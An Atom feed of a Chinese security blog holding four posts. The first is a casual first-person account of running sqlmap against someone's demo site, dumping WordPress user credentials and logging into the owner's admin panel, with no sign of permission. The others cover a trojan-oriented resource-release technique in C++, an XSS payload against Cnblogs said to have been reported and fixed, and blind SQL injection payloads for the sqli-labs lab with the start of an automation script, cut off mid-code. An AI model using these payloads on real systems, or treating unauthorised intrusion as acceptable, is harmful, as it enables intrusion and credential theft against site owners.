<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小艾搞安全</title>
  
  <subtitle>一直学习，一直分享。</subtitle>
  <link href="https://lxflxfcl.github.io/atom.xml" rel="self"/>
  
  <link href="https://lxflxfcl.github.io/"/>
  <updated>2021-11-11T12:26:55.234Z</updated>
  <id>https://lxflxfcl.github.io/</id>
  
  <author>
    <name>小艾</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>实战｜一个表白墙引发的“血案”</title>
    <link href="https://lxflxfcl.github.io/2021/11/11/%E5%AE%9E%E6%88%98%EF%BD%9C%E4%B8%80%E4%B8%AA%E8%A1%A8%E7%99%BD%E5%A2%99%E5%BC%95%E5%8F%91%E7%9A%84%E2%80%9C%E8%A1%80%E6%A1%88%E2%80%9D/"/>
    <id>https://lxflxfcl.github.io/2021/11/11/%E5%AE%9E%E6%88%98%EF%BD%9C%E4%B8%80%E4%B8%AA%E8%A1%A8%E7%99%BD%E5%A2%99%E5%BC%95%E5%8F%91%E7%9A%84%E2%80%9C%E8%A1%80%E6%A1%88%E2%80%9D/</id>
    <published>2021-11-11T12:22:51.000Z</published>
    <updated>2021-11-11T12:26:55.234Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这是一个风和日丽的下午，想着从网上找一套表白网的源码自己进行修改然后讨女友欢心。当我正在GitHub进行搜索翻阅时，一个表白墙的源码映入眼中。我好奇的点开演示网站，故事开始了。</p><span id="more"></span><h4 id="“血案”的引发"><a href="#“血案”的引发" class="headerlink" title="“血案”的引发"></a>“血案”的引发</h4><p>当我点击进入演示网站查看时，发现界面比较简洁。莫名的手痒了起来，想尝试搞一番。界面如下：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/f5c4c08b33e4722b8e7ba73428f559b5.png" alt="image-20211111193112079"></p><p>同时，我们观察界面也会发现，这个演示网站其实是跑在他的博客上的，也就是说，如果这个演示页面有问题，那么它的博客也会沦陷。然后接着观察。</p><p>顺便添加了一个表白墙，看看功能，添加好以后，显示界面如下：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/1604f654be657c015bf4085d3f8d7a2b.png" alt="image-20211111193728790"></p><p>当我看到有参数可以传参时，因为有良好的职业素养，顺手一个单引号，看看效果。然后就看到了mysql的错误回显，当时我是非常震惊的。好嘛，这洞说来就来？</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/9c27664132364c33b037c7aae1101512.png" alt="image-20211111194114897"></p><p>这还废啥话，直接祭出sqlmap一把嗦。结果如下，不止存在报错注入，还存在时间和布尔盲注，如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/a021a7bb169ca30cae870898d2697d00.png" alt="image-20211111194544903"></p><p>还记得文章前面说的吗？这个演示站是搭建在作者自己的博客上的，这里存在sql注入，是可以把他博客打下来的。话不多说，开整。继续使用sqlmap得知，数据库中有一个库，库中存在多张表。如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/f934beb6df7b75302bd145416e7c2b23.png" alt="image-20211111195322502"></p><p>根据表我们可以知道我们猜的没有错，博客确实和演示站用的同一个库。接下来就是找账号密码了。我们发现在表中是存在wp_users表的，我们想要的数据肯定也是在这张表中。我们猜的不错，确实存在。结果如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/4230b1f06f143cf7be26361a4b96e83b.png" alt="image-20211111201926680"></p><p>一共两个账户，但是第二个账号的密码没有解密出来，但是我们得到了第一个账户的密码。接下来就是找后台了。其实我们通过表名前缀就可以知道这个开源博客程序WordPress。如果不清楚，我们可以借助指纹识别插件来进行识别。如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/7828c29729633f968ecb18cd49ad3adc.png" alt="image-20211111200334662"></p><p>同样可以识别出来，既然已经知道了是WordPress，那么后台也就很好找了，WordPress的默认后台路径为wp-login.php，我们可以尝试一下。很幸运，作者并没有改后台路径，如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/51481a20580f2ccc069b252bfd2ec6c3.png" alt="image-20211111200656776"></p><p>通过我们刚才获取到的账号密码，成功登陆后台。</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/19007a4c50825a1ad58e74db1457c1ef.png" alt="image-20211111200845443"></p><p>故事到这里就结束了。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>在这里再次嘱咐大家，在实际环境中开发者要秉持“外部参数皆不可信原则”进行开发。</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;这是一个风和日丽的下午，想着从网上找一套表白网的源码自己进行修改然后讨女友欢心。当我正在GitHub进行搜索翻阅时，一个表白墙的源码映入眼中。我好奇的点开演示网站，故事开始了。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞挖掘" scheme="https://lxflxfcl.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="渗透测试" scheme="https://lxflxfcl.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Windows黑客编程之资源释放技术.md</title>
    <link href="https://lxflxfcl.github.io/2021/11/07/Windows%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE%E6%8A%80%E6%9C%AF/"/>
    <id>https://lxflxfcl.github.io/2021/11/07/Windows%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE%E6%8A%80%E6%9C%AF/</id>
    <published>2021-11-07T12:05:36.000Z</published>
    <updated>2021-11-07T12:12:01.031Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天说一下写病毒木马会广泛使用的一种技术——资源释放技术。为什么我们在写木马时会使用到资源释放技术呢？这是因为它可以使我们写的程序变得简洁。如果程序需要额外加载一些DLL文件或者文本文件，我们可以把它们作为资源插入到程序里。等程序运行，再把它们释放到本地。这样好处是只有一个.exe文件，这就降低了被发现的风险。</p><span id="more"></span><p>参考资料《Windows黑客编程》</p><h3 id="资源插入"><a href="#资源插入" class="headerlink" title="资源插入"></a>资源插入</h3><p>说资源释放前，下面先说一下资源插入，资源插入不需要编写代码，只需要手动设置VS开发环境就可以。首先新建一个文件，这里命名为lxf ,然后在里面写上内容，内容为my name is lxf，如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/537f790f9d77f1774877844ee84e1fe7.png" alt="image-20211106212130307"></p><p>然后在VS2017中新建一个项目，在项目的解决方案里右键=》添加=》资源，如下图</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/2c898beb38bd446593f3da24f54bf24b.png" alt="image-20211106212844487"></p><p>点击资源后，然后再新弹出来的对话框，点击自定义，然后在资源类型框里填MYRES，最后点击导入，将刚才新建的文件导入到这里。如下图：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/39e0a8452ae187f3c0ae43051ed357be.png" alt="image-20211106213401609"></p><p>倒入成功后，插入资源就完成了。</p><h3 id="释放资源"><a href="#释放资源" class="headerlink" title="释放资源"></a>释放资源</h3><p>接下来看一下释放资源的案例代码，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取资源</span></span><br><span class="line"><span class="function">BOOL <span class="title">FreeMyResourse</span><span class="params">(UINT uiResouceName, <span class="keyword">char</span> *lpszResourceType, <span class="keyword">char</span> *lpszSaveFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取指定模块的资源</span></span><br><span class="line">HRSRC hRsrc = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(uiResouceName), lpszResourceType);</span><br><span class="line"><span class="keyword">if</span> (hRsrc == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t find the resource!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取资源的大小</span></span><br><span class="line">DWORD dwSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line"><span class="keyword">if</span> (dwSize &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the resource&#x27;s size is error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将资源加载到内存里</span></span><br><span class="line">HGLOBAL hGlobal = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line"><span class="keyword">if</span>(hGlobal == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;load resource error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//锁定资源</span></span><br><span class="line">LPVOID lpVoid = <span class="built_in">LockResource</span>(hGlobal);</span><br><span class="line"><span class="keyword">if</span> (lpVoid == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lock resource error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存资源为文件</span></span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">fopen_s</span>(&amp;fp, lpszSaveFileName, <span class="string">&quot;wb+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open file error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fwrite</span>(lpVoid, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), dwSize, fp);</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> lpszResourceType[<span class="number">20</span>] = <span class="string">&quot;MYRES&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> szSaveFileName[<span class="number">20</span>] = <span class="string">&quot;lxf.txt&quot;</span>;</span><br><span class="line">BOOL flag = <span class="built_in">FreeMyResourse</span>(IDR_MYRES4,lpszResourceType, szSaveFileName);</span><br><span class="line"><span class="keyword">if</span> (flag == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;释放成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面写了释放资源的案例代码，这里讲解一下吧，<strong>首先是FindResource函数</strong>，<strong>这个函数的作用就是确定模块中指定类型和名称的资源所在位置</strong>。</p><p>函数原型：</p><p>HRSRC FindResource（HMODULE hModule，LPCTSTR lpName，LPCTSTR lpType)</p><p>参数：</p><ul><li>  hModule：处理包含资源的可执行文件的模块。NULL值则指定模块句柄指向操作系统通常情况下创建最近过程的相关位图文件。</li><li>  lpName：指定资源名称。</li><li>  lpType：指定资源类型。</li></ul><p>返回值：</p><p>如果函数成功运行，那么返回值为指定资源信息块的句柄。可将句柄传递给LoadResource函数来获得这些资源。如果失败，返回NULL。</p><p><strong>接下来是SizeofResource函数</strong>。<strong>这个函数的作用是获取指定资源的字节数。</strong></p><p>函数原型：</p><p>DWORD SizeofResource(HMODULE hModule，HRSRC hReslnfo);</p><p>参数：</p><ul><li>hModule：包合资源的可执行文件模块的句柄。</li><li>hReslnfo：资源句柄。此句柄必须由函数FindResource或FindResourceEx来创建。</li></ul><p>返回值：</p><p>如果函数运行成功，返回值资源的字节数。如果函数运行失败，返回值为零。若想获得更多的错误信息，请调用GetLastError函数。</p><p><strong>接着是LoadResource函数</strong>。<strong>这个函数的作用是装载指定资源到全局存储器。</strong></p><p>函数原型:</p><p> HGLOBAL LoadResource(HMODULE hModule，HRSRC hReslnfo);</p><p>参数：</p><ul><li>hModule：处理包合资源的可执行文件的模块句柄。若hModule为NULL，系统从当前过程中的模块中装载资源。</li><li>hReslnfo：将被装载资源的句柄。它必须由函数FindResource或FindResourceEx创建。</li></ul><p>返回值：如果函数运行成功，返回值是相关资源的数据的句柄。如果函数运行失败，返回值为NULL。若想获得更多的错误信息，请调用GetLastError函数。</p><p><strong>最后一个是LockResource函数，这个函数作用是锁定资源，并得到资源在内存中第一个字节的指针。</strong></p><p>函数原型:</p><p>LPVOID LockResource(HGLOBAL hResDate);</p><p>参数:</p><ul><li>hResDate：被装载的资源的句柄。函数LosdResource可以返回这个句柄。</li></ul><p>返回值：</p><p>如果被装载的资源被所住了，返回值是资源第一个字节的指针；否则为NULL。</p><p><strong>注意：通过使用函数FindResource或FindResourceEx返回句柄试图所住资源，不再工作。可以返回一个错误的数据和任意数据的指针。</strong></p><p>当使用完资源后，必须通过调用函数以释放加速器表、位图、光标、目标以及某单所占的内存资源：加速器表：DestroyAcceleratorTable；位图：DeleteObject；光标：DestroyCursor；图标：Destroylcon；菜单：DestroyMenu。</p><p>当过程创建终止时，系统将自动删除这些资源。但是调用相关函数也可以保留内存减少过程的工作设置所占空间。</p><p>相关函数说完了，最后再理一下代码流程。</p><ol><li>首先通过FindResource函数定位程序里的资源，主要根据资源类型，和资源名称定位，获得资源消息块的句柄。</li><li>然后根据获得的句柄，再通过SizeofResource函数获取资源的大小。</li><li>然后通过LoadResource函数把资源加载到程序内存中。</li><li>再然后通过LockResource函数锁定加载到内存中的资源，防止程序中的其他操作影响这块内存。返回值就是资源在进程内存中的起始地址。</li><li>最后资源大小以及进程内存的起始地址，可以将资源数据读出并保存为本地文件。</li></ol><p>还有最后一点需要注意，在main()函数里的第一行和第三行需要根据自己的实际情况进行修改。</p><h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><p>创建新项目，写入上述代码，然后运行程序，查看窗口，和项目目录，发现运行成功，资源释放成功。</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/11/2283190545d37da9ea4ed25bc4747084.png" alt="image-20211107200132012"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>关于资源释放就说到这里，如有错误请斧正。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;今天说一下写病毒木马会广泛使用的一种技术——资源释放技术。为什么我们在写木马时会使用到资源释放技术呢？这是因为它可以使我们写的程序变得简洁。如果程序需要额外加载一些DLL文件或者文本文件，我们可以把它们作为资源插入到程序里。等程序运行，再把它们释放到本地。这样好处是只有一个.exe文件，这就降低了被发现的风险。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows黑客编程" scheme="https://lxflxfcl.github.io/categories/Windows%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="病毒木马" scheme="https://lxflxfcl.github.io/tags/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>博客园漏洞挖掘</title>
    <link href="https://lxflxfcl.github.io/2021/10/05/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://lxflxfcl.github.io/2021/10/05/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2021-10-05T12:53:32.000Z</published>
    <updated>2021-10-07T03:44:28.604Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>闲来无事，想着在博客园中写一篇有关XSS的文章，结果有了意外收获。发现博客园在渲染的时候没有转译尖括号，也就有了今天这篇文章。</p><span id="more"></span><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>在写博客的时候，使用渲染功能时，发现博客园并没有转译尖括号，这让我有了想法，感觉博客园这里有搞头，可能存在XSS，于是，开始了测试，使用如下payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>结果如下图，果然解析了。</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/07feb116d0370d8b674be73e6b36bcb9.png"></p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/e55591b4c3034d084515a4ed41373938.png" alt="image-20210917195229363"></p><p>现在完成了第一步，但是预览这里的XSS只能自己插自己，没什么用，尝试着将文章发布，看看能不能打到其他人，发现发送的时候，存在过滤，删掉了onerror，猜测是黑名单过滤。存在绕过的可能。</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/adb4d276a56b0a0d2a6a9223b8e1981a.png" alt="image-20210917195342043"></p><p>经过多次尝试，使用如下payload</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/709d4b52f296eca4dbe9f7e4539e1b3c.png" alt="image-20210917195551472"></p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/6aad6e17538ad63805dc4c24813b0616.png" alt="image-20210917195611835"></p><p>成功绕过过滤，可以攻击其他人了。</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/c3af2cd89a0d0773da688e1f2f9b2500.png" alt="image-20210917195641765"></p><p>我将payload插入到之前发布的博客文章中，成功触发payload。</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/029494858a5382951c9db819e6deff8e.png" alt="image-20210919125650081"></p><p>证明不是self XSS</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/09/aab7286a447525523acf7819f4631513.png" alt="image-20210919125743646"></p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>本文涉及到的漏洞已经报送给相关厂商，厂商已修复漏洞。本文涉及的技术细节仅用于学习交流，请勿用于其他用途。</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;闲来无事，想着在博客园中写一篇有关XSS的文章，结果有了意外收获。发现博客园在渲染的时候没有转译尖括号，也就有了今天这篇文章。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞挖掘" scheme="https://lxflxfcl.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="渗透测试" scheme="https://lxflxfcl.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>用python写一个自动化盲注脚本</title>
    <link href="https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
    <id>https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</id>
    <published>2021-10-05T10:44:57.000Z</published>
    <updated>2021-10-19T10:50:00.577Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>当我们进行SQL注入攻击时，当发现无法进行union注入或者报错等注入，那么，就需要考虑盲注了，当我们进行盲注时，需要通过页面的反馈(布尔盲注)或者相应时间(时间盲注)，来一个字符一个字符的进行猜解。如果手工进行猜解，这就会有很大的工作量。所以这里就使用python写一个自动化脚本来进行猜解，靶场选择的是sqli-labs的第八关。</p><span id="more"></span><p>参考资料：《python安全攻防》</p><h4 id="和盲注相关的payload"><a href="#和盲注相关的payload" class="headerlink" title="和盲注相关的payload"></a>和盲注相关的payload</h4><p>写脚本之前需要对盲注流程有一个了解。这样写脚本时，思路才不会乱。这里用sqli-labs的第八关举例。具体如下：</p><p>获取数据库长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(length(database())=8,1,0) %23</span><br></pre></td></tr></table></figure><p>获取数据库名</p><blockquote><p>substr:字符串截取函数，第一位截取，截取一位</p></blockquote><p>连起来就是，截取数据库名第一位，并判断第一位的ascii值，是否等于115，如果为正确，直接返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(ascii(substr(database(),1,1))=115,1,0) %23</span><br></pre></td></tr></table></figure><p>获取数据库表的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=4,1,0) %23</span><br></pre></td></tr></table></figure><p>获取数据库表名称的长度</p><blockquote><p>要注意limit，第一个参数的意思是从第几行开始，最低是0，第二个参数是截取几行。这里1是一行的意思。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1)=8,1,0) %23</span><br></pre></td></tr></table></figure><p>获取数据库表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,1,0) %23</span><br></pre></td></tr></table></figure><p>获取表的字段数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select count(column_name) from information_schema.cloumns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=3,1,0) %23</span><br></pre></td></tr></table></figure><p>获取字段的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select length(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1)=2,1,0) %23</span><br></pre></td></tr></table></figure><p>获取表的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,0) %23</span><br></pre></td></tr></table></figure><p>获取字段数据的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select count(username) from users)=13,1,0) %23</span><br></pre></td></tr></table></figure><p>获取字段数据的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select length(username) from users limit 0,1)=4,1,0) %23</span><br></pre></td></tr></table></figure><p>获取字段数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if (ascii(substr((select username from users limit 0,1),1,1))=68,1,0) %23</span><br></pre></td></tr></table></figure><h4 id="盲注脚本相关函数讲解"><a href="#盲注脚本相关函数讲解" class="headerlink" title="盲注脚本相关函数讲解"></a>盲注脚本相关函数讲解</h4><p>首先编写主函数，用来调用各个函数，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#盲注主函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StartSqli</span>(<span class="params">url</span>):</span></span><br><span class="line">    GetDBName(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]当前数据库名：&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(DBName))</span><br><span class="line">    GetDBTables(url,DBName)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 数据库 &#123;0&#125; 的表如下：&quot;</span>.<span class="built_in">format</span>(DBName))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(DBTables)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(item + <span class="number">1</span> ) + <span class="string">&quot;)&quot;</span> + DBTables[item])</span><br><span class="line">    tableIndex = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*] 请输入要查看的表的序号 :&quot;</span>)) - <span class="number">1</span></span><br><span class="line">    GetDBColumns(url,DBName,DBTables[tableIndex])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 数据表 &#123;0&#125; 的字段如下:&quot;</span>.<span class="built_in">format</span>(DBTables[tableIndex]))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(DBColumns)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(item + <span 